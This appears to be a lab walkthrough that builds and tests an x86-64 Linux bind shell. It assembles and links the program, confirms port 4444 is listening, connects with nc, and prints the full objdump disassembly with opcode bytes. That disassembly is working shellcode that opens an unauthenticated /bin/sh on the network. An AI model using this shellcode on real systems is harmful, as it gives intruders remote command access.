### **Installing NASM and Build Essentials**
```bash
sudo apt install nasm build-essential
```
- **nasm** and **build-essential** are already installed.

---

### **Assembling the Code**
```bash
nasm -f elf64 bindshell.nasm -o bindshell.o
```
- This command assembles the `bindshell.nasm` file into an object file (`bindshell.o`) in ELF64 format.

---

### **Linking the Object File to Create an Executable**
```bash
ld bindshell.o -o bindshell
```
- **Warning**: `ld: warning: cannot find entry symbol _start; defaulting to 0000000000401000`
  - This warning occurs because the linker cannot find the `_start` symbol, which is typically the entry point of a program. It defaults to a memory address.

---

### **Running the Executable**
```bash
./bindshell
```
- The program runs without visible output.

---

### **Checking Open Ports with `netstat`**
```bash
netstat -nlt
```
- Output shows that port `4444` is listening:
  ```
  Proto Recv-Q Send-Q Local Address           Foreign Address         State      
  tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN     
  ```

---

### **Connecting to the Bind Shell Using `nc`**
```bash
nc localhost 4444
```
- Commands executed after connecting:
  ```bash
  id
  uid=1000(tyrell) gid=1000(tyrell) groups=1000(tyrell),4(adm),20(dialout),24(cdrom),27(sudo),30(dip),33(www-data),46(plugdev),100(users),114(lpadmin)

  ls
  README.md
  bindshell
  bindshell.nasm
  bindshell.o

  whoami
  tyrell
  ```

---

### **Disassembling the Object File with `objdump`**
- **Command to disassemble**:
  ```bash
  objdump -D -M intel bindshell.o
  ```
- **Output**:
  ```assembly
  bindshell.o:     file format elf64-x86-64

  Disassembly of section .text:

  0000000000000000 <.text>:
     0:   31 c0                 xor    eax,eax
     2:   31 db                 xor    ebx,ebx
     4:   31 d2                 xor    edx,edx
     6:   b0 01                 mov    al,0x1
     8:   89 c6                 mov    esi,eax
     a:   fe c0                 inc    al
     c:   89 c7                 mov    edi,eax
     e:   b2 06                 mov    dl,0x6
    10:   b0 29                 mov    al,0x29
    12:   0f 05                 syscall
    14:   93                    xchg   ebx,eax
    15:   48 31 c0              xor    rax,rax
    18:   50                    push   rax
    19:   68 02 01 11 5c        push   0x5c110102
    1e:   88 44 24 01           mov    BYTE PTR [rsp+0x1],al
    22:   48 89 e6              mov    rsi,rsp
    25:   b2 10                 mov    dl,0x10
    27:   89 df                 mov    edi,ebx
    29:   b0 31                 mov    al,0x31
    2b:   0f 05                 syscall
    2d:   b0 05                 mov    al,0x5
    2f:   89 c6                 mov    esi,eax
    31:   89 df                 mov    edi,ebx
    33:   b0 32                 mov    al,0x32
    35:   0f 05                 syscall
    37:   31 d2                 xor    edx,edx
    39:   31 f6                 xor    esi,esi
    3b:   89 df                 mov    edi,ebx
    3d:   b0 2b                 mov    al,0x2b
    3f:   0f 05                 syscall
    41:   89 c7                 mov    edi,eax
    43:   48 31 c0              xor    rax,rax
    46:   89 c6                 mov    esi,eax
    48:   b0 21                 mov    al,0x21
    4a:   0f 05                 syscall
    4c:   fe c0                 inc    al
    4e:   89 c6                 mov    esi,eax
    50:   b0 21                 mov    al,0x21
    52:   0f 05                 syscall
    54:   fe c0                 inc    al
    56:   89 c6                 mov    esi,eax
    58:   b0 21                 mov    al,0x21
    5a:   0f 05                 syscall
    5c:   48 31 d2              xor    rdx,rdx
    5f:   48 bb ff 2f 62 69 6e  movabs rbx,0x68732f6e69622fff
    66:   2f 73 68 
    69:   48 c1 eb 08           shr    rbx,0x8
    6d:   53                    push   rbx
    6e:   48 89 e7              mov    rdi,rsp
    71:   48 31 c0              xor    rax,rax
    74:   50                    push   rax
    75:   57                    push   rdi
    76:   48 89 e6              mov    rsi,rsp
    79:   b0 3b                 mov    al,0x3b
    7b:   0f 05                 syscall
    7d:   50                    push   rax
    7e:   5f                    pop    rdi
    7f:   b0 3c                 mov    al,0x3c
    81:   0f 05                 syscall
  ```

---

### **Key Points**
1. **`ld` Warning**: The linker warns about the missing `_start` symbol, which is the default entry point for programs.
2. **Bind Shell**: The program listens on port `4444` and provides a shell when connected via `nc`.
3. **Disassembling**: `objdump` is a useful tool for disassembling object files and inspecting assembly code.


